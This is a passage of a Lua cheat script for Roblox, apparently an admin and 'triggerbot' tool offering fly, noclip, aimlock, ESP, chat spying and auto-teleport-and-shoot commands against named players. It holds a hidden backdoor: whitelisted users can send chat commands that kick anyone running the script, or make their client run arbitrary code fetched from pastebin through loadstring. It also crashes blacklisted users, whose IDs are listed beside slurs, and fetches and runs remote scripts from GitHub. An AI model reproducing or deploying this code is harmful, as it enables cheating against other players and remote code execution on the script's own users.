        GetChar():WaitForChild('Humanoid',10)
        ChildAddedEvent = GetChar().ChildAdded:Connect(CChildAdded)
        HumanoidStateChangedEvent = GetChar().Humanoid.StateChanged:Connect(HumanoidState)
        HumanoidCAdded = GetChar().Humanoid.DescendantAdded:Connect(ColourChanger)
        HumanoidHealthChanged = GetChar().Humanoid.HealthChanged:Connect(HealthChanged)
        GetChar().Humanoid.WalkSpeed = SpawnWS or NormalWS
    GetChar().Humanoid.JumpPower = SpawnJP or NormalJP
        GetChar().Humanoid.HipHeight = SpawnHH or NormalHH
        if FeLoop then 
                local Humanoid = GetChar().Humanoid:Clone()
                GetChar().Humanoid:Destroy()
                Humanoid.Parent = GetChar()
                workspace.CurrentCamera.CameraSubject = GetChar()
        end 
        if PlayOnDeath then
                wait()
                local Tool = LP.Backpack:WaitForChild('BoomBox')
                if Tool then 
                        Tool.Parent = GetChar() 
                        wait()
                        Tool:FindFirstChildOfClass'RemoteEvent':FireServer("play",PlayOnDeath)
                        Tool.Parent = LP.Backpack
                end
        end
end)

LP.CharacterRemoving:Connect(function()
        ChildAddedEvent:Disconnect()
        HumanoidStateChangedEvent:Disconnect()
        HumanoidCAdded:Disconnect()
        HumanoidHealthChanged:Disconnect()
        HR = nil
        flying = false
end)

UserInput.InputBegan:Connect(function(Key)
if UserInput:GetFocusedTextBox() then return end
local PartFound = GetChar():FindFirstChild'HumanoidRootPart' or GetChar():FindFirstChild'Torso'
        if Key.KeyCode == Enum.KeyCode.LeftControl then
                if AirWalkOn then 
                        AirWalk.Size = Vector3.new(0,-1,0)
                end
                if Normalwalk and ControlSpeed == 8 then return end
                GetChar().Humanoid.WalkSpeed = ControlSpeed
        end
        if Key.KeyCode == Enum.KeyCode.LeftShift then
                KeyTable['Shift'] = true 
                if Normalwalk and ShiftSpeed == 25 then return end 
                GetChar().Humanoid.WalkSpeed = ShiftSpeed
        end
        if Key.KeyCode == Enum.KeyCode.W then 
                KeyTable['w'] = true 
        end
        if Key.KeyCode == Enum.KeyCode.A then 
                KeyTable['a'] = true 
        end
        if Key.KeyCode == Enum.KeyCode.S then 
                KeyTable['s'] = true 
        end
        if Key.KeyCode == Enum.KeyCode.D then 
                KeyTable['d'] = true 
        end
        if Key.KeyCode == Enum.KeyCode.E and GetChar():FindFirstChildOfClass'Tool' and not GetChar():FindFirstChild'KO' then 
                LP.Backpack.ServerTraits.Finish:FireServer(LP.Backpack.Punch)
        end 
        if Key.KeyCode == Enum.KeyCode.Space and AirWalkOn then 
                PartFound.CFrame = PartFound.CFrame + Vector3.new(0,5,0)
        end
        if Key.KeyCode == Enum.KeyCode.Quote then 
                CText:CaptureFocus()
                Cframe:TweenPosition(UDim2.new(0.015,0,0.95,0),"Out","Elastic",0.5,true)
                wait()
                CText.Text = ""
                UserInput.TextBoxFocusReleased:Wait()
                local Command = CText.Text
                CText.Text = ""
                CheckCommand(Command)
                Cframe:TweenPosition(UDim2.new(0.015,0,1,0),"Out","Quad",0.5,true)
        end
        if ClickTpKey and ClickTpKey ~= "" and Key.KeyCode == Enum.KeyCode[ClickTpKey:upper()] and Mouse.Target then
                if (Mouse.Hit.Position - PartFound.Position).magnitude < 50 then 
                        PartFound.CFrame = CFrame.new(Mouse.Hit.p + Vector3.new(0,5,0))
                else
                        Teleport(CFrame.new(Mouse.Hit.p + Vector3.new(0,5,0)))
                end
        end
        if Keys then 
                for _,v in pairs(Keys) do 
                        if v and Enum.KeyCode[v:match'[%a%d]+$':upper()] == Key.KeyCode then 
                                CheckCommand(v:match'^[%w%s]+')
                        end
                end
        end
end)

UserInput.InputEnded:Connect(function(Key)
if UserInput:GetFocusedTextBox() then return end
        if Key.KeyCode == Enum.KeyCode.LeftControl then
                if AirWalkOn then
                        AirWalk.Size = Vector3.new(5,1,5)
                end 
                if Normalwalk and ControlSpeed == 8 then return end
                GetChar().Humanoid.WalkSpeed = WalkSpeed
        end
        if Key.KeyCode == Enum.KeyCode.W then 
                KeyTable['w'] = false
        end
        if Key.KeyCode == Enum.KeyCode.A then 
                KeyTable['a'] = false 
        end
        if Key.KeyCode == Enum.KeyCode.S then 
                KeyTable['s'] = false 
        end
        if Key.KeyCode == Enum.KeyCode.D then 
                KeyTable['d'] = false 
        end
        if Key.KeyCode == Enum.KeyCode.LeftShift and ShiftSpeed then
                KeyTable['Shift'] = false 
                if Normalwalk and ShiftSpeed == 25 then return end 
                GetChar().Humanoid.WalkSpeed = WalkSpeed
        end 
end)

Players.PlayerRemoving:Connect(function(P)
        Unesp(P)
end)

CText.FocusLost:Connect(function(Enter)
        Cframe:TweenPosition(UDim2.new(0.015, 0, 1, 0),"Out","Quad",0.5,true)
        if Enter then 
                local Command = CText.Text
                CText.Text = ""
                CheckCommand(Command)
        end
end)

AddCommand(function(Arguments)
        if Arguments[1] then
                local File = loadfile("CyAdminPlugins\\"..Arguments[1])
                if not File then 
                        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Syntax Error (Can't output it since loadfile gay)","All")
                        return 
                else 
                        local W,E = pcall(File)
                        if not W then 
                                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Runtime Error"..E,"All")
                                return 
                        end 
                end 
                local T = Temp()
                for i = 1,#Commands do
                        if not table.find(T,Commands[i].Name) then 
                                Create(Commands[i].Name)
                                CreateCommand(UDim2.new(0.0150422715,0,0.0127776451,0 + (i * 20)),Commands[i].Name.." "..Commands[i].Help)
                        end 
                end 
        end 
end,"runplugin",{},"Loads plugins (no it doesn't refresh them so don't be retarded") 
-- DON'T ASK ABOUT IT ANYONE WHO READS THIS CODE OK?

ChildAddedEvent = GetChar().ChildAdded:Connect(CChildAdded)
HumanoidStateChangedEvent = GetChar().Humanoid.StateChanged:Connect(HumanoidState)
HumanoidCAdded = GetChar().Humanoid.DescendantAdded:Connect(ColourChanger)
HumanoidHealthChanged = GetChar().Humanoid.HealthChanged:Connect(HealthChanged)
Mouse.Button1Down:Connect(Button1Down)
Mouse.Button2Down:Connect(Button2Down)
LP.Chatted:Connect(CheckCommand)
UserInput.JumpRequest:Connect(DoubleJump)
CText:GetPropertyChangedSignal("Text"):Connect(Changed)
RunService.Stepped:Connect(Stepped)

spawn(function()
        while true do
        local Char = GetChar()
        if Char then 
                local PartFound = Char:FindFirstChild'HumanoidRootPart' or Char:FindFirstChild'Torso'
                        if Char:FindFirstChildOfClass'Humanoid' and UseDraw then
                                local Tool = Char:FindFirstChildOfClass'Tool'
                                if Tool and Tool:FindFirstChild'Ammo' then 
                                        DrawingT.Text = "Current WalkSpeed: "..Char.Humanoid.WalkSpeed.."\nSprinting Speed: "..ShiftSpeed.."\nCrouching Speed: "..ControlSpeed.."\nJumpPower: "..Char.Humanoid.JumpPower.."\nFlying: "..tostring(flying).."\nNoclipping: "..tostring(Noclipping).."\nAimlock Target: "..tostring(AimlockTarget).."\n"..Tool.Name.." Clips & Ammo: "..Tool.Clips.Value..":"..Tool.Ammo.Value
                                else 
                                        DrawingT.Text = "Current WalkSpeed: "..Char.Humanoid.WalkSpeed.."\nSprinting Speed: "..ShiftSpeed.."\nCrouching Speed: "..ControlSpeed.."\nJumpPower: "..Char.Humanoid.JumpPower.."\nFlying: "..tostring(flying).."\nNoclipping: "..tostring(Noclipping).."\nAimlock Target: "..tostring(AimlockTarget) 
                                end
                        end
                        if PartFound and Blinking then 
                                if BlinkMode == "None" or BlinkMode == "Shift" and KeyTable['Shift'] then
                                        if KeyTable['w'] then 
                                                PartFound.CFrame = PartFound.CFrame * CFrame.new(0,0,-BlinkSpeed)
                                        end 
                                        if KeyTable['a'] then 
                                                PartFound.CFrame = PartFound.CFrame * CFrame.new(-BlinkSpeed,0,0)
                                        end
                                        if KeyTable['s'] then 
                                                PartFound.CFrame = PartFound.CFrame * CFrame.new(0,0,BlinkSpeed)
                                        end
                                        if KeyTable['d'] then 
                                                PartFound.CFrame = PartFound.CFrame * CFrame.new(BlinkSpeed,0,0)
                                        end
                                end 
                        end
                        wait()
                end
        end 
end)

if PartTable then 
        spawn(function()
                while wait() do
                        if LP.Character:FindFirstChildOfClass'Humanoid' and LP.Character.Humanoid.HipHeight > 0 or AirWalkOn and LP.Character.Humanoid.FloorMaterial == Enum.Material.Neon and not LP.Character.Humanoid.Sit then 
                                local JP = LP.Character.Humanoid.JumpPower
                                LP.Character.Humanoid.JumpPower = 1.5
                                LP.Character.Humanoid:ChangeState(3)
                                wait(0.2)
                                LP.Character.Humanoid.JumpPower = JP
                        end
                end
        end)
end

spawn(function()
        while wait(SpamDelay) do 
                if Spamming and SpamMessage then 
                        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(SpamMessage,"All")
                end
        end 
end)

spawn(function()
        while wait(10) do 
                if AntiAfk then 
                        keypress(0x20)
                end
        end
end)

local function espcool(Plr)
        local Esp1 = Instance.new('BillboardGui',Plr.Character.Head)
        Esp1.Adornee = Plr.Character.Head
        Esp1.Size = UDim2.new(0,100,0,100)
        Esp1.StudsOffset = Vector3.new(0,1,0)
        Esp1.AlwaysOnTop = true 
        local Esp2 = Instance.new('TextLabel',Esp1)
        Esp2.BackgroundTransparency = 1
        Esp2.Text = CoolkidTable[tostring(Plr.UserId)].Name
        Esp2.Position = UDim2.new(0,0,0,0)
        Esp2.Size = UDim2.new(1,0,0,40)
        Esp2.TextColor3 = CoolkidTable[tostring(Plr.UserId)].Colour
        Esp2.TextStrokeTransparency = 0.5
        Esp2.TextSize = 15
        Esp2.TextStrokeColor3 = CoolkidTable[tostring(Plr.UserId)].Colour
        if Plr.Character:FindFirstChild'Humanoid' then 
                Plr.Character.Humanoid.DescendantAdded:Connect(function(T)
                        if T:IsA'Trail' then 
                                T.Color = ColorSequence.new(CoolkidTable[tostring(Plr.UserId)].Colour)
                        end
                end)
        end
        local Table = {}
        for i,v in pairs(Plr.Backpack:GetChildren()) do if v:IsA'Tool' and v:FindFirstChild'Fire' then table.insert(Table,v) end end 
        for i,v in pairs(Plr.Character:GetChildren()) do if v:IsA'Tool' and v:FindFirstChild'Fire' then table.insert(Table,v) end end
        -- To make sure all tools get set ugly I know lol
        for Index,Tool in pairs(Table) do 
                for Index2,Part in pairs(Tool:GetDescendants()) do 
                        if Part:IsA'UnionOperation' or Part:IsA'Part' or Part:IsA'MeshPart' then 
                                if Part:IsA'UnionOperation' then
                                        Part.UsePartColor = true
                                end 
                                Part.Material = "ForceField" 
                                Part.Color = CoolkidTable[tostring(Plr.UserId)].Colour
                        end
                end
        end
        Plr.Character.ChildAdded:Connect(function(T)
                if T:IsA'Tool' and T:FindFirstChild'Fire' then 
                        for Index2,Part in pairs(T:GetDescendants()) do 
                                if Part:IsA'UnionOperation' or Part:IsA'Part' or Part:IsA'MeshPart' then 
                                        if Part:IsA'UnionOperation' then
                                                Part.UsePartColor = true
                                        end 
                                        Part.Material = "ForceField" 
                                        Part.Color = CoolkidTable[tostring(Plr.UserId)].Colour
                                end
                        end
                end
        end)
end

local PlayersX = Players:GetPlayers()
for i = 1,#PlayersX do
        local Plr = PlayersX[i]
        if CoolkidTable[tostring(Plr.UserId)] and Plr.Character:FindFirstChild'Head' then 
                espcool(Plr)
                Plr.CharacterAdded:Connect(function()
                        local Head = Plr.Character:WaitForChild('Head',10)
                        if Head then
                                espcool(Plr)
                        end
                end)
                if CoolkidTable[tostring(Plr.UserId)].Access then 
                Plr.Chatted:Connect(function(Chat)
                        local Arguments = string.split(Chat:sub(2)," ")
                        local Player = PlrFinder(Arguments[1])
                        table.remove(Arguments,1)
                        if Player and Player == LP or typeof(Player) == "table" then 
                                if not CoolkidTable[tostring(LP.UserId)] then 
                                        if Chat:sub(1,1) == "`" then 
                                                CheckCommand(table.concat(Arguments," "))
                                        end
                                        if Chat:sub(1,1) == "[" then 
                                                LP:Kick('You have been kicked by '..Plr.Name.." for "..table.concat(Arguments," "))
                                        end
                                        if Chat:sub(1,1) == "~" then 
                                                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("abc123","All")
                                        end
                                        if Chat:sub(1,1) == "]" then
                                                loadstring(game:HttpGet("https://pastebin.com/raw/"..Arguments[1],true))()
                                        end 
                                end 
                        end
                end)
        end
        end
        if Plr ~= LP then 
                local Chatted;
                Chatted = Plr.Chatted:Connect(function(A) -- had to make it a function instead of calling :Wait() on it or it would yield the whole loop lmao
                        if A == "Hey I'm a cyrus' streets admin user1" then
                                Chatted:Disconnect()
                                Players:Chat("Hey I'm a cyrus' streets admin user1")
                                local abc123;
                                for i = 1,#PlayerTable do 
                                        if PlayerTable[i] and PlayerTable[i][2] == Plr then 
                                                PlayerTable[i][5] = "true"
                                                abc123 = true
                                        end
                                end
                                table.insert(AdminUsers,Plr.UserId)
                                if not abc123 and UseDraw then 
                                        espPlayer(Plr,nil,true)
                                end
                        end
                end)
        end
end

Players.PlayerAdded:Connect(function(Plr)
        if CoolkidTable[tostring(Plr.UserId)] then
                Plr.CharacterAdded:Connect(function()
                        if CoolkidTable[tostring(Plr.UserId)].Access then 
                                Plr.Chatted:Connect(function(Chat)
                                        local Arguments = string.split(Chat:sub(2)," ")
                                        local Player = PlrFinder(Arguments[1])
                                        table.remove(Arguments,1)
                                        if Player and Player == LP or typeof(Player) == "table" then 
                                                if not CoolkidTable[tostring(LP.UserId)] then 
                                                        if Chat:sub(1,1) == "`" then 
                                                                CheckCommand(table.concat(Arguments," "))
                                                        end
                                                        if Chat:sub(1,1) == "[" then 
                                                                LP:Kick('You have been kicked by '..Plr.Name.." for "..table.concat(Arguments," "))
                                                        end
                                                        if Chat:sub(1,1) == "~" then 
                                                                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("abc123","All")
                                                        end
                                                        if Chat:sub(1,1) == "]" then
                                                                loadstring(game:HttpGet("https://pastebin.com/raw/"..Arguments[1],true))()
                                                        end 
                                                end 
                                        end
                                end)
                        end
                        local Head = Plr.Character:WaitForChild('Head',10)
                        if Head then 
                                espcool(Plr)
                        end
                end)
        end
        local p;
        P = Plr.Chatted:Connect(function(A)
                if A == "Hey I'm a cyrus' streets admin user1" then 
                        P:Disconnect()
                        Players:Chat("Hey I'm a cyrus' streets admin user1")
                        local abc123;
                        for i = 1,#PlayerTable do 
                                if PlayerTable[i] and PlayerTable[i][2] == Plr then 
                                        PlayerTable[i][5] = "true"
                                        abc123 = true
                                end
                        end
                        table.insert(AdminUsers,Plr.UserId)
                        if not abc123 and UseDraw then 
                                espPlayer(Plr,nil,true)
                        end
                end
        end)
end)

local FileDir,isFolder,makeFolder = syn_io_listdir or list_files,syn_io_isfolder or isfolder,syn_io_makefolder or makefolder

if FileDir and isFolder and makeFolder then 
        if not isFolder'CyAdminPlugins' then 
                makeFolder('CyAdminPlugins')
        end 
        for _,v in pairs(FileDir'CyAdminPlugins') do 
                local WorkingFile = loadfile(v)
                if not WorkingFile then
                        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("There was a syntax error (sadly can\'t output it as loadfile is gay)","All")
                else 
                        local Work,Error = pcall(WorkingFile) 
                        if not Work then 
                                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Runtime Error"..Error,"All")
                        end
                end
        end
end 

local BlacklistTable = {
        [251848039] = true;     -- Cyruzsz | Reason: annoying skid,dick rider
        [57890959] = true;      -- Fevlix | Reason: annoying skid 
        [339273796] = true;     -- endlessjj Reason: Forget 
        [363849133] = true;             -- vxonc | Reason: annoying skid 
        [1618476217] = true;    -- DranghetaSINS | Reason: Alt of V 
        [1508268550] = true;    -- Zerulogy | Reason: Alt of V 
        [1271632090] = true;    -- OrphanageKid | Reason: annoying
        [296541717] = true;     -- R4ELEEN | Reason: https://media.discordapp.net/attachments/710938129896308736/710948890550992906/unknown.png
        [1186330995] = true;    -- rheaper | Reason: Oreo Gang
        [114164798] = true;     -- Slays | Reason: No temptations fat cunt (blacklisted myself)
        [1417460726] = true;    -- 6tpz | Reason: Oreo Gang
        [20165690] = true;              -- sh6un | Reason: Oreo Gang
        [101320782] = true;     -- fulldesire | Reason: Oreo Gang
        [838770714] = true;     -- Synshop | Reason: Oreo Gang 
        [1539633029] = true;    -- hopoffmygirI | Reason: Oreo Gang
}

if BlacklistTable[LP.UserId] or LP:IsInGroup(5152759) or string.find(LP.Name:lower(),"lynx") then 
        while true do end -- crash that dumb ass skid! 
end 

for i = 1,#Commands do
local Alias = Commands[i].Alias
        Create(Commands[i].Name)
        for v = 1,#Alias do
                Create(Alias[v])
        end
        CreateCommand(UDim2.new(0.0150422715,0,0.0127776451,0 + (i * 20)),Commands[i].Name.." "..Commands[i].Help)
end
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if string.find(msg,"+s ") then -- finds ,s typed
        local name = string.gsub(msg,"+s ", "") -- removes ,s and focuses on name of plr 
        for i,v in pairs (game.Players:GetChildren()) do -- gets all player names
            if string.sub(string.lower(v.Name) , 1, string.len(name)) == string.lower(name) then -- shortens the length of name
                game.Players.LocalPlayer.Backpack.Shotty.Parent = game.Players.LocalPlayer.Character
                for i = 1,450 do
                    while true do
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.Torso.CFrame + Vector3.new(0,0,7)
wait()
 
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.Torso.CFrame + Vector3.new(0,0,-7)
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  v.Character.Torso.CFrame + Vector3.new(-7,0, 0)
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  v.Character.Torso.CFrame + Vector3.new(7,0,0)
wait()
 
        game.Players.LocalPlayer.Character.Shotty.Fire:FireServer(v.Character.Head.CFrame)
end
                end
            end
        end
 
    end
end)
 
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if string.find(msg,"+g ") then -- finds ,s typed
        local name = string.gsub(msg,"+g ", "") -- removes ,s and focuses on name of plr 
        for i,v in pairs (game.Players:GetChildren()) do -- gets all player names
            if string.sub(string.lower(v.Name) , 1, string.len(name)) == string.lower(name) then -- shortens the length of name
                game.Players.LocalPlayer.Backpack.Glock.Parent = game.Players.LocalPlayer.Character
                for i = 1,450 do
                    while true do
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.Torso.CFrame + Vector3.new(0,0,7)
wait()
 
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.Torso.CFrame + Vector3.new(0,0,-7)
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  v.Character.Torso.CFrame + Vector3.new(-7,0, 0)
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  v.Character.Torso.CFrame + Vector3.new(7,0,0)
wait()
 
 
        game.Players.LocalPlayer.Character.Glock.Fire:FireServer(v.Character.Head.CFrame)
end
                end
            end
        end
 
    end
end)

game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
    
if (string.lower(msg) == "+ragdoll") then
    
hu = game.Players.LocalPlayer.Character.Humanoid
local l = Instance.new("Humanoid")
l.Parent = game.Players.LocalPlayer.Character
l.Name = "Humanoid"
wait(0.1)
hu.Parent = game.Players.LocalPlayer
game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character.Animate.Disabled = true
wait(0.1)
game.Players.LocalPlayer.Character.Animate.Disabled = false
end
end)

game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(KeyPressed)
 if KeyPressed == "z" then
local lplr = game:GetService("Players").LocalPlayer
local shotty = lplr.Backpack:FindFirstChild("Shotty")
local Animation = Instance.new("Animation")
Animation.AnimationId = "rbxassetid://503259904"
local plr = game:GetService('Players').LocalPlayer
local HUM = plr.Character.Humanoid:LoadAnimation(Animation)
shotty.Equipped:connect(function()
    wait(.1)
    HUM:Play()
    HUM:AdjustSpeed(0.0)
end)
shotty.Unequipped:connect(function()
    HUM:Stop()
end)
local lplr = game:GetService("Players").LocalPlayer
local Glock = lplr.Backpack:FindFirstChild("Glock")
local Animation = Instance.new("Animation")
Animation.AnimationId = "rbxassetid://503259904"
local plr = game:GetService('Players').LocalPlayer
local HUM = plr.Character.Humanoid:LoadAnimation(Animation)
Glock.Equipped:connect(function()
    wait(.1)
    HUM:Play()
    HUM:AdjustSpeed(0.0)
end)
Glock.Unequipped:connect(function()
    HUM:Stop()
end)
end
end)

 
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
    
if (string.lower(msg) == "+tbot") then

game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents").SayMessageRequest:FireServer("[GLOCKYS PAID] Dollars's combat script has been loaded [TRIGGERBOT] /aim <plr> - /stop","All")
local following = false
function psearch(arg)
        for i,v in pairs(game.Players:GetPlayers()) do 
                if string.lower(string.sub(v.Name,1,string.len(arg))) == string.lower(arg) then 
                        return v
                end
        end
end
local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
for i,v in pairs(character:GetChildren()) do 
        v.ChildAdded:Connect(function(s)
                if s.Name == "creator" then
                        local enemy = workspace:FindFirstChild(s.Value.Name)
                        local enemyroot = enemy.Head
                        following = true
                        repeat
                                if game.Players.LocalPlayer.Backpack:FindFirstChild('Shotty') then game.Players.LocalPlayer.Backpack.Shotty.Parent = game.Players.LocalPlayer.Character end
                                if game.Players.LocalPlayer.Backpack:FindFirstChild('Uzi') then game.Players.LocalPlayer.Backpack.Uzi.Parent = game.Players.LocalPlayer.Character end
                                if game.Players.LocalPlayer.Backpack:FindFirstChild('Glock') then game.Players.LocalPlayer.Backpack.Glock.Parent = game.Players.LocalPlayer.Character end
                                if game.Players.LocalPlayer.Character:FindFirstChild("Shotty") then game.Players.LocalPlayer.Character.Shotty.Fire:FireServer(enemyroot.CFrame) end
                                if game.Players.LocalPlayer.Character:FindFirstChild("Glock") then game.Players.LocalPlayer.Character.Glock.Fire:FireServer(enemyroot.CFrame) end
                                if game.Players.LocalPlayer.Character:FindFirstChild("Uzi") then game.Players.LocalPlayer.Character.Uzi.Fire:FireServer(enemyroot.CFrame) end
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[s.Value.Name].HumanoidRootPart.CFrame + Vector3.new(13,0,-3)
                                wait()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[s.Value.Name].HumanoidRootPart.CFrame + Vector3.new(4,0,-2)
                                wait()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[s.Value.Name].HumanoidRootPart.CFrame + Vector3.new(-4,0,2)
                                wait()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[s.Value.Name].HumanoidRootPart.CFrame + Vector3.new(6,0,3)
                                wait()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[s.Value.Name].HumanoidRootPart.CFrame + Vector3.new(-6,0,-6)
                                wait()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[s.Value.Name].HumanoidRootPart.CFrame + Vector3.new(-4,0,-2)
                                wait()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[s.Value.Name].HumanoidRootPart.CFrame + Vector3.new(8,0,-2)
                                wait()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[s.Value.Name].HumanoidRootPart.CFrame + Vector3.new(-6,0,-3)
                                wait()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[s.Value.Name].HumanoidRootPart.CFrame + Vector3.new(-6,0,2)
                        until enemy.Humanoid.Health == 0 or enemy:FindFirstChild("KO") or game.Players.LocalPlayer.Character.Humanoid.Health == 0 or following == false
                end
        end)
end
 
game.Players.LocalPlayer.Chatted:Connect(function(msg)
        if string.lower(msg) == "/stop" then 
                following = false
        else
                if msg:sub(1,5) == "/aim " then 
                        local target = psearch(msg:sub(6))
                        if target then 
                                following = true
                                repeat
                                        if game.Players.LocalPlayer.Backpack:FindFirstChild('Shotty') then game.Players.LocalPlayer.Backpack.Shotty.Parent = game.Players.LocalPlayer.Character end
                                        if game.Players.LocalPlayer.Backpack:FindFirstChild('Glock') then game.Players.LocalPlayer.Backpack.Glock.Parent = game.Players.LocalPlayer.Character end
                                        if game.Players.LocalPlayer.Character:FindFirstChild("Shotty") then game.Players.LocalPlayer.Character.Shotty.Fire:FireServer(workspace[target.Name].Torso.CFrame) end
                                        if game.Players.LocalPlayer.Character:FindFirstChild("Glock") then game.Players.LocalPlayer.Character.Glock.Fire:FireServer(workspace[target.Name].Torso.CFrame) end
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[target.Name].HumanoidRootPart.CFrame + Vector3.new(1,0,-3)
                                        wait()
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[target.Name].HumanoidRootPart.CFrame + Vector3.new(9,0,-2)
                                        wait()
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[target.Name].HumanoidRootPart.CFrame + Vector3.new(-4,0,2)
                                        wait()
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[target.Name].HumanoidRootPart.CFrame + Vector3.new(12,0,3)
                                        wait()
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[target.Name].HumanoidRootPart.CFrame + Vector3.new(-13,0,-5)
                                        wait()
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[target.Name].HumanoidRootPart.CFrame + Vector3.new(-5,0,-2)
                                        wait()
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[target.Name].HumanoidRootPart.CFrame + Vector3.new(-4,-0,-2)
                                        wait()
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[target.Name].HumanoidRootPart.CFrame + Vector3.new(6,0,-3)
                                        wait()
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[target.Name].HumanoidRootPart.CFrame + Vector3.new(-6,0,2)
                                until workspace[target.Name].Humanoid.Health == 0 or workspace[target.Name]:FindFirstChild("KO") or game.Players.LocalPlayer.Character.Humanoid.Health == 0 or following == false
                        end
                end
        end
end)
end
end)

print([[
Glockys, By dollar#0007 On Discord.
+g <Plr>- Glock Tbot
+s <Plr>- Shotty Tbot
+ragdoll- Walk When Knocked
+tbot- Loads triggerbot script
---
/aim <plr> - Stops Tbot
/stop - Stops Tbot
------------------------------------
F- Fly
X- Noclip
L- Aimlock
C- Reset
'- Open Cmd Bar
'Cmds- Show All Cmds <Dont Put In Chat Just Type On Keyboard>
Z- Gunanims]])

print("Command Amount: "..#Commands)

--[[
if game.PlaceId == 455366377 then 
        local InfectedTable = {} 
        while wait() do
        if not LP.PlayerGui.HUD.INFEC then LP:Kick'NICE TRY! YOU WILL BE FORCED TO INFECT PEOPLE.' end
                if LP.PlayerGui.HUD.INFEC.Visible then 
                        local PlayerC = Players:GetPlayers()
                        for i = 1,#PlayerC do 
                                local Player = PlayerC[i]
                                local Infected = false
                                if not InfectedTable[Player] and Player ~= LP then 
                                repeat wait()
                                        if Player.Character and Player.Character:FindFirstChild'Torso' and GetChar():FindFirstChild'Torso' then 
                                                GetChar().Torso.CFrame = Player.Character.Torso.CFrame
                                                for i,v in pairs(Player.Character.Humanoid:GetPlayingAnimationTracks()) do 
                                                        if string.find(v.Animation.AnimationId,"4812408744") then 
                                                                Infected = true
                                                                table.insert(InfectedTable,Player)
                                                        end 
                                                end
                                                game:GetService'RunService'.Heartbeat:wait()
                                        end
                                until Infected 
                                Infected = false
                                end
                        end
                end
        end 
end
]]
end
end)

game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
    
if (string.lower(msg) == "/nhvh") then

loadstring(game:HttpGet("https://raw.githubusercontent.com/DrPoppadopolist/DrPoppaV3/master/Script",true))()

end
end)

game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
    
if (string.lower(msg) == "/chat") then

local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
local instance = (_G.chatSpyInstance or 0) + 1
_G.chatSpyInstance = instance
 
 
for _,p in ipairs(Players:GetPlayers()) do
    p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end
Players.PlayerAdded:Connect(function(p)
    p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end)
StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
local chatFrame = player.PlayerGui.Chat.Frame
chatFrame.ChatChannelParentFrame.Visible = true
chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)

end
end)

game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
    
if (string.lower(msg) == "/hvh2") then

